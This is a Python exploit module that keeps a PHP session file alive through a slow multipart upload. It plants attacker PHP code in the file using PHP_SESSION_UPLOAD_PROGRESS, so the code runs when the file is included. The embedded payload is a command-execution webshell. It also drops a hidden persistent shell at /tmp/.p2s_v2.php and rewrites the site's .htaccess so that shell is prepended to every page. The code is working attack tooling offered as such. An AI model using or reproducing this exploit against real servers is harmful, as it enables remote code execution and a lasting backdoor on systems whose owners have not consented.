"""Slow multipart upload that keeps a PHP session file alive on disk.

Sends a POST with PHP_SESSION_UPLOAD_PROGRESS containing attacker-controlled
text (PHP code), followed by a file upload sent at ~1KB/2s. While the upload
is in progress, the session file at /tmp/sess_<PHPSESSID> exists on disk and
contains the progress key (our PHP code) in its serialized session data.

Session file content (php serializer format):
  upload_progress_<?php code ?>|a:5:{s:10:"start_time";...}

When included via auto_prepend_file, PHP parses:
  - "upload_progress_" → output as text
  - "<?php code ?>" → executed as PHP
  - "|a:5:{...}" → output as text

Requirements:
  - session.upload_progress.enabled = 1 (default: ON)
  - session.use_strict_mode = 0 (default: OFF in most builds)
  - session.save_path = /tmp (default)
  - Session ID must be hex (session.sid_bits_per_character = 4, default)
"""
from __future__ import annotations

import socket
import threading
import time


SESSION_ID = "aabb00cc"
SESSION_PATH = f"/tmp/sess_{SESSION_ID}"

WEBSHELL_BOOTSTRAP = (
    '<?php '
    'if(isset($_GET["c"])){'
    'echo "<<<P2S>>>";system($_GET["c"]);echo "<<<P2E>>>";'
    '}'
    'if(!file_exists("/tmp/.p2s_v2.php")){'
    'file_put_contents("/tmp/.p2s_v2.php",'
    '\'<?php if(isset($_GET["c"])){echo "<<<P2S>>>";system($_GET["c"]);echo "<<<P2E>>>";}\');'
    '@file_put_contents("/var/www/html/.htaccess",'
    '\'php_value auto_prepend_file "/tmp/.p2s_v2.php"\');'
    '}'
    '?>'
)


class SlowUpload:
    """Background slow upload that keeps a PHP session file alive."""

    def __init__(self, host: str, port: int, path: str,
                 session_id: str = SESSION_ID,
                 php_code: str = WEBSHELL_BOOTSTRAP,
                 chunk_interval: float = 2.0):
        self.host = host
        self.port = port
        self.path = path
        self.session_id = session_id
        self.php_code = php_code
        self.chunk_interval = chunk_interval
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self._started = threading.Event()
        self._error: str | None = None

    @property
    def session_path(self) -> str:
        return f"/tmp/sess_{self.session_id}"

    def start(self) -> bool:
        """Start slow upload in background. Returns True when session file should exist."""
        self._thread = threading.Thread(target=self._upload_loop, daemon=True)
        self._thread.start()
        self._started.wait(timeout=10)
        if self._error:
            return False
        time.sleep(3)
        return True

    def stop(self):
        """Stop the slow upload — session file will be cleaned up by PHP."""
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._thread:
            self._thread.join(timeout=5)

    def _upload_loop(self):
        boundary = b"----P2SZeroCrash"

        progress_part = (
            b"------P2SZeroCrash\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
            b"\r\n"
            + self.php_code.encode() +
            b"\r\n"
        )

        file_header = (
            b"------P2SZeroCrash\r\n"
            b'Content-Disposition: form-data; name="file"; filename="data.bin"\r\n'
            b"Content-Type: application/octet-stream\r\n"
            b"\r\n"
        )

        closing = b"\r\n------P2SZeroCrash--\r\n"
        file_size = 10 * 1024 * 1024
        total = len(progress_part) + len(file_header) + file_size + len(closing)

        headers = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Cookie: PHPSESSID={self.session_id}\r\n"
            f"Content-Type: multipart/form-data; boundary=----P2SZeroCrash\r\n"
            f"Content-Length: {total}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()

        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(300)
            self._sock.connect((self.host, self.port))

            self._sock.sendall(headers)
            self._sock.sendall(progress_part)
            self._sock.sendall(file_header)

            self._started.set()

            sent = 0
            chunk = b"B" * 1024
            while not self._stop.is_set() and sent < file_size:
                try:
                    self._sock.sendall(chunk)
                    sent += len(chunk)
                except (BrokenPipeError, ConnectionError):
                    break
                self._stop.wait(self.chunk_interval)

        except Exception as e:
            self._error = str(e)
            self._started.set()
        finally:
            if self._sock:
                try:
                    self._sock.close()
                except OSError:
                    pass
